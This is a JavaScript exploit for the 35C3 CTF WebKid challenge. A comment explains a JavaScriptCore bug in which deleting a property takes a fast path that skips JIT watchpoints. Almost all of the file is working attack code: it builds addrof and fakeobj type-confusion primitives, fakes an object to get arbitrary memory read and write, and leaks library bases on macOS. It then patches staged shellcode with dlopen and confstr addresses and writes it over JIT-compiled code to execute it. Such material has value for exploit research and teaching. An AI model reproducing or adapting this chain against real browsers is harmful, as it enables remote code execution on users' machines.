/*
 * Exploit for the WebKid challenge of 35C3CTF.
 *
 * Copyright (c) 2018 Samuel Groß
 *
 * Bug: the newly added fast path for property deletions doesn't trigger watchpoints.
 *
 * There are two mechanisms for type checking in the JIT: runtime type checks (CheckStructure) and
 * Watchpoint. The latter is often used when an object from an outer scope is referenced. Watchpoints
 * essentially trigger a callback once the watched object is modified, in which case the compiled
 * code is discarded. However, watching single objects isn't possible. Instead, if the structure of
 * the object has never transitioned before (is a leaf), then a watchpoint is installed to fire as
 * soon as the structure transitions. This is used as a heursitic for the object itself changing.
 * The problem now is that the fast path for property deletions doesn't trigger these watchpoints
 * (because no structure transition is performed). As such, type confusions are possible afterwards.
 *
 * Example:
 *
 * var o = [1.1, 2.2, 3.3, 4.4];
 * // o is now an object with structure ID 122.
 * o.property = 42;
 * // o is now an object with structure ID 123. The structure is a leaf (has never transitioned)
 *
 * function helper() {
 *     return o[0];
 * }
 * jitCompile(helper);
 * // In this case, the JIT compiler will choose to use a watchpoint instead of runtime checks
 * // when compiling the helper function. As such, it watches structure 123 for transitions.
 *
 * delete o.property;
 * // o now "went back" to structure ID 122. The watchpoint was not fired.
 * o[0] = {};
 * // o now transitioned from structure ID 122 to structure ID 124 (due to the array mode change).
 * // The watchpoint still didn't fire.
 *
 * return helper();         // type confusion -> addrof
 */

const ITERATIONS = 100000;
function jitCompile(f, ...args) {
    for (var i = 0; i < ITERATIONS; i++) {
        f(...args);
    }
}
jitCompile(function dummy() { return 42; });

function makeJITCompiledFunction() {
    // Some code that can be overwritten by the shellcode.
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    jitCompile(target, 123);

    return target;
}

function setup_addrof() {
    var o = [1.1, 2.2, 3.3, 4.4];
    o.addrof_property = 42;

    // JIT compiler will install a watchpoint to discard the
    // compiled code if the structure of |o| ever transitions
    // (a heuristic for |o| being modified). As such, there
    // won't be runtime checks in the generated code.
    function helper() {
        return o[0];
    }
    jitCompile(helper);

    // This will take the newly added fast-path, changing the structure
    // of |o| without the JIT code being deoptimized (because the structure
    // of |o| didn't transition, |o| went "back" to an existing structure).
    delete o.addrof_property;

    // Now we are free to modify the structure of |o| any way we like,
    // the JIT compiler won't notice (it's watching a now unrelated structure).
    o[0] = {};

    return function(obj) {
        o[0] = obj;
        return Int64.fromDouble(helper());
    };
}

function setup_fakeobj() {
    var o = [1.1, 2.2, 3.3, 4.4];
    o.fakeobj_property = 42;

    // Same as above, but write instead of read from the array.
    function helper(addr) {
        o[0] = addr;
    }
    jitCompile(helper, 13.37);

    delete o.fakeobj_property;
    o[0] = {};

    return function(addr) {
        helper(addr.asDouble());
        return o[0];
    };
}

function pwn() {
    var addrof = setup_addrof();
    var fakeobj = setup_fakeobj();

    // Verify basic exploit primitives work.
    var addr = addrof({p: 0x1337});
    assert(fakeobj(addr).p == 0x1337, "addrof and/or fakeobj does not work");
    print('[+] exploit primitives working');

    // Spray structures to be able to predict their IDs.
    var structs = []
    for (var i = 0; i < 0x1000; ++i) {
        var array = [13.37];
        array.pointer = 1234;
        array['prop' + i] = 13.37;
        structs.push(array);
    }

    // Take an array from somewhere in the middle so it is preceeded by non-null bytes which
    // will later be treated as the butterfly length.
    var victim = structs[0x800];
    print(`[+] victim @ ${addrof(victim)}`);

    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
    var container = {
        header: flags_double_array,
        butterfly: victim
    };

    // Create object having |victim| as butterfly.
    var containerAddr = addrof(container);
    print(`[+] container @ ${containerAddr}`);
    var hax = fakeobj(Add(containerAddr, 0x10));
    var origButterfly = hax[1];

    var memory = {
        addrof: addrof,
        fakeobj: fakeobj,

        // Write an int64 to the given address.
        writeInt64(addr, int64) {
            hax[1] = Add(addr, 0x10).asDouble();
            victim.pointer = int64.asJSValue();
        },

        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
        write16(addr, value) {
            // Set butterfly of victim object and dereference.
            hax[1] = Add(addr, 0x10).asDouble();
            victim.pointer = value;
            hax[1] = origButterfly;
        },

        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
        write(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i < ints.length; i++)
                this.write16(Add(addr, 2 * i), ints[i]);
        },

        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
        read64(addr) {
            // Set butterfly of victim object and dereference.
            hax[1] = Add(addr, 0x10).asDouble();
            return this.addrof(victim.pointer);
        },

        // Verify that memory read and write primitives work.
        test() {
            var v = {};
            var obj = {p: v};

            var addr = this.addrof(obj);
            assert(this.fakeobj(addr).p == v, "addrof and/or fakeobj does not work");

            var propertyAddr = Add(addr, 0x10);

            var value = this.read64(propertyAddr);
            assert(value.asDouble() == addrof(v).asDouble(), "read64 does not work");

            this.write16(propertyAddr, 0x1337);
            assert(obj.p == 0x1337, "write16 does not work");
        },
    };

    // Warmup, otherwise stuff will crash if the function is JIT compiled
    for (var i = 0; i < 100; i++)
        memory.write16(Sub(Int64.fromDouble(origButterfly), 0x10), 1337);

    var plainObj = {};
    var header = memory.read64(addrof(plainObj));
    memory.writeInt64(memory.addrof(container), header);

    memory.test();
    print("[+] limited memory read/write working");

    const JSC_VTAB_OFFSET = 0x16c08;
    const STRLEN_GOT_OFFSET = 0x1018;
    const DYLD_STUB_LOADER_OFFSET = 0x2ac4;
    const STRLEN_OFFSET = 0x19b700;
    const DLOPEN_OFFSET = 0x252b;
    const CONFSTR_OFFSET = 0x1e10;

    // Find binary base
    var funcAddr = memory.addrof(Math.sin);
    var executableAddr = memory.read64(Add(funcAddr, 24));
    var codeAddr = memory.read64(Add(executableAddr, 24));
    var vtabAddr = memory.read64(codeAddr);
    var jscBase = Sub(vtabAddr, JSC_VTAB_OFFSET);
    print("[*] JavaScriptCore.dylib @ " + jscBase);

    var dyldStubLoaderAddr = memory.read64(jscBase);
    var dyldBase = Sub(dyldStubLoaderAddr, DYLD_STUB_LOADER_OFFSET);
    var strlenAddr = memory.read64(Add(jscBase, STRLEN_GOT_OFFSET));
    var libCBase = Sub(strlenAddr, STRLEN_OFFSET);
    //var libCBase = new Int64("0x0007fff69d89000");
    print("[*] dyld.dylib @ " + dyldBase);
    print("[*] libsystem_c.dylib @ " + libCBase);

    var confstrAddr = Add(libCBase, CONFSTR_OFFSET);
    print("[*] confstr @ " + confstrAddr);
    var dlopenAddr = Add(dyldBase, DLOPEN_OFFSET);
    print("[*] dlopen @ " + dlopenAddr);

    //memory.write16(new Int64("0x414141414141"), 42);

    // Patching shellcode
    var stage2Addr = memory.addrof(stage2);
    stage2Addr = memory.read64(Add(stage2Addr, 16));
    print("[*] Stage 2 payload @ " + stage2Addr);

    stage1.replace(new Int64("0x4141414141414141"), confstrAddr);
    stage1.replace(new Int64("0x4242424242424242"), stage2Addr);
    stage1.replace(new Int64("0x4343434343434343"), new Int64(stage2.length));
    stage1.replace(new Int64("0x4444444444444444"), dlopenAddr);
    print("[+] Shellcode patched");

    var func = makeJITCompiledFunction();
    var funcAddr = memory.addrof(func);

    print(`[+] shellcode function object @ ${funcAddr}`);
    var executableAddr = memory.read64(Add(funcAddr, 24));
    print(`[+] executable instance @ ${executableAddr}`);
    var jitCodeObjAddr = memory.read64(Add(executableAddr, 24));
    print(`[+] JITCode instance @ ${jitCodeObjAddr}`);
    //var jitCodeAddr = memory.read64(Add(jitCodeObjAddr, 368));      // offset for debug builds
    var jitCodeAddr = memory.read64(Add(jitCodeObjAddr, 352));
    print(`[+] JITCode @ ${jitCodeAddr}`);

    memory.write(jitCodeAddr, stage1);

    var res = func();
    print("[+] done");
}

if (typeof(window) === 'undefined')
    pwn();
